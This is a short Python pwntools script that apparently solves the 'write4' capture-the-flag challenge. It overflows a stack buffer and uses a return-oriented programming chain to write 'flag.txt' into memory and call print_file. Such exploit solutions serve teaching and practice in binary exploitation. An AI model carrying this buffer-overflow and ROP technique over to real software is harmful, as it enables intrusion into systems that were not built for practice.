from pwn import *

sh = process("./write4")

# gadget
pop_r14_r15 = 0x0000000000400690
mov_addr_r14_r15 = 0x0000000000400628
pop_rdi = 0x0000000000400693
data_pos = 0x00601028
# flag.txt
flag_txt = b"flag.txt"
# print_file
print_file = 0x400620

# payload
payload = b'a'*32 + p64(0xdeadbeef) + p64(pop_r14_r15) + p64(data_pos) + flag_txt + p64(mov_addr_r14_r15)
payload += p64(pop_rdi) + p64(data_pos)
payload += p64(print_file)

sh.sendline(payload)
sh.interactive()
